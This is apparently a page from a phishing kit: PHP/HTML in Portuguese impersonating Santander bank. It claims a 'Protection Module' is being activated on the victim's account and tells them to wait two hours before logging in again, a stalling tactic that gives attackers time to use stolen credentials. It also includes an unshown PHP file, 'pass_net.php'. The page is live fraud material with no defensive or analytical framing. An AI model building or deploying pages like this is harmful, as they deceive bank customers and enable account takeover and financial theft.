<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle">
				<h1>Módulo de Proteção</h1>
				<p style="padding:0 60px;font-size:11px!important;font-weight: normal!important;line-height: 18px;">
					<span style="color:green;font-weight: bold!important;">O Módulo de Proteção Santander está em processo de ativação em sua conta.</span> 
					<br><br><br>
					<span class="red_txt">Por favor aguarde o prazo de 02 (duas) horas para acessar sua conta novamente com todos os plugins de segurança ativos.
				</p>
				
			</div>

			<div class="md_boxTables">
				
				<div class="loader"></div>

				<span class="infx_ld" style="color:#ed2228;font-weight: normal!important;line-height: 15px;font-size:10px;padding:0 20px;">
					Você pode optar por fechar esta esta janela e aguardar o prazo de 02 (duas) horas para total ativação do Módulo de Segurança Santander em sua conta.
				</span>
			</div><!-- md_boxTables -->

			<br><br>
		</div><!-- ld_box -->
	</div>
</body>
</html>